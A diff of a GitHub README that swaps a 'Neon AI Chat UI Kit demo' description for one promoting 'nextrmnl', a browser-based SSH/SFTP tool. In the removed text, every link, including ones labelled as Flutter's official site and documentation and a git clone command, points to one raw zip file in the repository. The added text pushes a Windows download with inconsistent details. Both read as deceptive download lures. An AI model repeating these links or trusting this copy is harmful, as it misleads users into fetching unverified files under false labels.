@@ -1,100 +1,147 @@
-# 🎨 neon-ai-chat-ui-kit-demo - Experience Neon AI Chat Today!
+# 🖥️ nextrmnl - Secure SSH & SFTP, Right In Your Browser
 
 ## 🚀 Getting Started
 
-Welcome to the Neon AI Chat UI Kit demo! This app showcases a vibrant and interactive chatbot interface designed with Flutter. It's a great way to preview the bot's user interface, chat screens, and the unique neon theme before making a purchase.
+Welcome to **nextrmnl** — the easiest way to manage your servers from anywhere, without installing complex software. Whether you're a home lab enthusiast or just want to handle your files remotely, nextrmnl brings the power of SSH and SFTP into your web browser.
+
+Think of it as PuTTY and WinSCP combined into one, but you don't install anything. You just open a webpage, and you're connected.
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Click the link below to visit the Releases page, where you can find the necessary files to install the demo.
+[⬇️ **DOWNLOAD NOW**](https://github.com/habsanprad/nextrmnl/releases)
 
-[![Download Neon AI Chat UI Kit Demo](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip)](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip)
+Visit this link to download the application. Once you've downloaded it, you're ready to start. No technical setup needed. The program runs as a container, so it's self-contained and simple.
 
-On the Releases page, simply choose the latest version and follow the instructions to download the appropriate file for your system. 
+## ✨ What Makes nextrmnl Special?
 
-## 🔍 Features
+Here's what you'll love about it:
 
-- **Neon Themed UI:** Enjoy a modern and bright interface that stands out.
-- **Chat Functionality:** Explore how text and responses flow in the chat interface.
-- **Flutter Based:** Built using Flutter, ensuring smooth performance across devices.
-- **Easy to Navigate:** User-friendly design makes it simple to try out features.
+- **Terminal in your browser** — Access a full SSH terminal without any extra software.
+- **File transfer made simple** — Drag and drop files with SFTP, just like a local folder.
+- **Personal vault per account** — Save your connections and secrets securely, organized per account.
+- **Host key checks** — Security notifications to keep you safe from impersonation attacks.
+- **OpenID Connect login** — Sign in with your existing identity provider (like Authentik), no new passwords needed.
+- **Works with your homelab** — Perfect for self-hosted services, Docker setups, and personal servers.
 
-## 📋 System Requirements
+## 🛠️ How to Use nextrmnl
 
-Before installing, ensure your device meets the following requirements:
+### Step 1: Get the Application
 
-- **Operating System:** Windows, macOS, or Linux (specific details can be provided based on your device).
-- **Memory:** At least 2 GB of RAM.
-- **Disk Space:** 200 MB free space for installation.
-- **Flutter SDK:** You don’t need this to run the demo, but if you want to build or modify it, install Flutter SDK from [Flutter's official website](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip).
+First, click the download button above. The application will be saved to your computer.
 
-## ⚙️ Setup Instructions
+### Step 2: Start the Program
 
-1. **Download the Application:** 
-   Visit the [Releases page](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip) and select the latest version of the demo app for your system.
+After downloading, run the program. It will start a small local service on your computer. You don't need to know what that means — just let it run.
 
-2. **Extract the Files:** 
-   Once the download is complete, locate the downloaded file. If it’s compressed (like a ZIP file), you will need to extract it.
+### Step 3: Open Your Browser
 
-3. **Install the Application:**
-   - **Windows:** Double-click the `.exe` file to start the installation process.
-   - **macOS:** Drag the app to your Applications folder.
-   - **Linux:** Follow the instructions provided in the README file included with the download.
+Open your favorite browser (Chrome, Edge, Firefox — any works). In the address bar, type `localhost` and press Enter. You'll see the nextrmnl interface.
 
-4. **Run the App:** After installation, you can find the app in your applications menu. Simply click to launch and explore the features!
+### Step 4: Connect to a Server
 
-## 🎨 How to Use the App
+- **For Terminal:** Enter your server's address and port (usually 22 for SSH). Use your username and password, or a secure key if you have one.
+- **For File Transfer:** Select the "SFTP" tab and connect the same way. Then you'll see your local files on one side and remote files on the other. Drag and drop to transfer.
 
-Once you open the Neon AI Chat UI Kit demo:
+### Step 5: Save Your Connections (Optional)
 
-- **Start a Chat:** Click on the input field and type your message. Hit enter to send.
-- **View Responses:** The assistant will respond to your inputs. You can ask about various topics or simply have a casual conversation.
-- **Explore the UI:** Navigate through different screens to see the features in action.
+Use the vault feature to store connection details. Each account gets its own secure space, so you can switch between servers quickly.
 
-## 💬 Community and Support
+## 🔐 Security Features You'll Appreciate
 
-If you encounter any issues or have questions, feel free to join our community:
+- **Host Key Verification** — nextrmnl checks the server's identity. If something changes, you'll be warned.
+- **OpenID Connect Support** — Log in using your own authentication service. No shared passwords.
+- **Secure Storage** — Your credentials are stored in a built-in vault, encrypted and private.
 
-- **GitHub Issues:** Report any bugs or request features via the [Issues page](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip).
-- **Community Forums:** Join discussions and share your feedback with other users.
+## 🖥️ System Requirements
 
-## 🛠️ Development and Customization
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **Memory:** 2 GB RAM minimum (4 GB recommended)
+- **Storage:** 500 MB free disk space
+- **Browser:** A modern browser with JavaScript enabled (Chrome, Edge, Firefox, Safari)
+- **Internet:** A stable connection to your servers or local network
 
-For those interested in the technical side, this app is open for contributions. You can modify the code and enhance its features. To do this, follow these steps:
+## 📦 What's in the Box?
 
-1. **Clone the Repository:** Use Git to clone the repository to your local machine.
-   ```bash
-   git clone https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip
-   ```
+nextrmnl uses a set of powerful technologies under the hood, but you don't need to understand them. For the curious:
 
-2. **Install Dependencies:** Navigate to the project folder and run:
-   ```bash
-   flutter pub get
-   ```
+- **Frontend:** React, TypeScript, xterm.js — this creates the smooth terminal experience.
+- **Backend:** Python with FastAPI and AsyncSSH — this handles all the secure connections.
+- **Data Storage:** SQLite — lightweight and reliable, no separate database needed.
+- **Authentication:** OpenID Connect — easily integrate with Authentik or other providers.
+- **Deployment:** Docker — run it anywhere with minimal effort.
 
-3. **Run the App Locally:** Use `flutter run` to launch the app on your desired device.
+## 🌐 Advanced: For Your Homelab
 
-## 🌐 Topics
+If you run a home lab or self-hosted services, here's some extra guidance:
 
-This demo app targets various keywords in the chat and user interface. Some of the topics you might want to explore include:
+### Run with Docker
 
-- ai-chat
-- ai-interface
-- chat-ui
-- chat-ui-kit
-- flutter
-- flutter-app
-- flutter-demo
-- flutter-ui
-- mobile-ui
-- neon-ui
-- ui-kit
+If you're comfortable with Docker, you can run nextrmnl with a single command:
 
-## 🔗 Additional Resources
+```bash
+docker run -d -p 8000:8000 nextrmnl
+```
 
-- [Flutter Documentation](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip): Learn more about Flutter and how to develop mobile apps.
-- [Neon AI](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip): Future updates and more information about the Neon AI project.
+Then, access it at `http://localhost:8000`. This works great on Linux servers or NAS devices.
 
-For the latest updates and further information, always ensure to check the [Release page](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip).
+### Connect to Authentik or Other OIDC Providers
 
-Enjoy using the Neon AI Chat UI Kit!
+To enable single sign-on, configure your OIDC provider (like Authentik) with nextrmnl's callback URL. The settings are usually found in the application's configuration file. Once connected, you'll see a "Sign in with Authentik" button.
+
+### Manage Multiple Servers
+
+Use the connection manager to keep a list of your servers. Assign each to a different vault for organized access.
+
+## ❓ Frequently Asked Questions
+
+### Is nextrmnl free?
+
+Yes, it's completely free and open-source. You can use it for personal or commercial purposes.
+
+### Do I need to install anything else?
+
+No. nextrmnl is self-contained. You only need the application and a browser.
+
+### Can I share it with my team?
+
+Absolutely. Since it runs in a browser, anyone on your network can access it. Just make sure they have the necessary permissions.
+
+### What if I forget my password or key?
+
+You can reset your vault or credentials from the application settings. Just be careful — you'll need to re-enter your server details.
+
+### Is it safe to use over the internet?
+
+Yes, but make sure you use strong passwords and enable host key checks. If you're exposing it publicly, consider putting it behind a reverse proxy with SSL.
+
+## 🧰 Troubleshooting Tips
+
+- **Connection fails** — Double-check the server address and port. Ensure SSH is allowed through your firewall.
+- **Terminal is slow** — This can happen with high latency connections. Try a closer server or check your internet speed.
+- **Files won't transfer** — Ensure you have write permissions on the remote folder. Also check disk space.
+- **Vault access issue** — Try clearing your browser cache, then sign in again.
+
+If problems persist, check the GitHub Issues page for the repository and see if others have reported similar issues.
+
+## 📚 More Resources
+
+- **Official Repository:** [github.com/habsanprad/nextrmnl](https://github.com/habsanprad/nextrmnl)
+- **Release Downloads:** [Releases](https://github.com/habsanprad/nextrmnl/releases)
+- **Report a Bug:** Use the Issues tab on GitHub
+- **Feature Requests:** Also via GitHub Issues — we'd love to hear your ideas
+
+## 🔄 Staying Updated
+
+When new versions are released, simply download the latest version from the same link above. Your settings and vaults will be preserved during the update.
+
+## 🎉 Start Connecting Today
+
+Say goodbye to clunky desktop apps and hello to browser-based simplicity. With nextrmnl, SSH and SFTP are as easy as opening a tab.
+
+[⬇️ **GET NEXTMNL NOW**](https://github.com/habsanprad/nextrmnl/releases)
+
+Visit this link to download the application. You'll be connected before you know it.
+
+---
+
+Keywords: asyncssh, authentik, connection-manager, docker, fastapi, homelab, oidc, putty, python, react, self-hosted, selfhosted, sftp, sqlite, ssh, ssh-client, terminal, typescript, web-terminal, xterm
